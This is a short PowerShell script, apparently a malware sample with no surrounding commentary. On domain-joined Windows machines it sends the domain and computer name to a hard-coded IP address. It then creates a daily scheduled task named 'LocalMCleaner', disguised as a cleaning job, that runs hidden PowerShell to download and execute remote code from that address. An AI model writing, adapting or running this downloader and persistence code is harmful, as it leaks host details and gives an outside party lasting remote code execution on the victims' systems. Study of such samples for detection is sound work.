$computerInfo = Get-ComputerInfo  
if ($computerInfo.CsPartOfDomain) 
{ 
    $domain = $computerInfo.Domain  
    $computerName = $computerInfo.CsName  
    $domain = $computerInfo.CsDomain
    $fullString = $domain+"_"+$computerName 
    $url = "http://64.182.116.12/images/?q="+$fullString  
    try {  
        $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
    } catch { 
    }  
    $ccc = '"' + "powershell.exe -nop -w hidden -c  " + "'IEX (irm http://64.182.116.12/images/II11II11)" + "'" +'"'
    $str = "schtasks.exe /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 11:30 /f"
    iex  $str
} 
else
{  
    exit  
}
